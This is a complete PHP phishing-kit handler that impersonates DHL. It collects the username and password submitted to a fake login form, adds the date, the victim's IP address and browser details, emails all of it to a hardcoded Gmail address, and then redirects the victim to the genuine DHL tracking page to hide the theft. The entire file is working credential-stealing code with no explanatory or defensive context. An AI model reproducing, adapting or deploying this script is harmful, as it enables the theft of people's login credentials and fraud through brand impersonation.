<?

if ($_SERVER['REQUEST_METHOD'] == 'GET')
{
}


$adddate = date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message  = "----+ **DHL LATEST ReZulT** +----\n";
$message .= "username     : ".$_POST['username']."\n";
$message .= "password      : ".$_POST['password']."\n";
$message .= "----+ C0d3d by Avatar+----\n";
$message .= "Date & Time: $adddate\n";
$message .= "IP Address : ".$ip."\n";
$recipient = "adedapoakorede5@gmail.com";
$subject = "DHL REZULT | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location:  http://www.dhl.com/en/express/tracking.html");
?>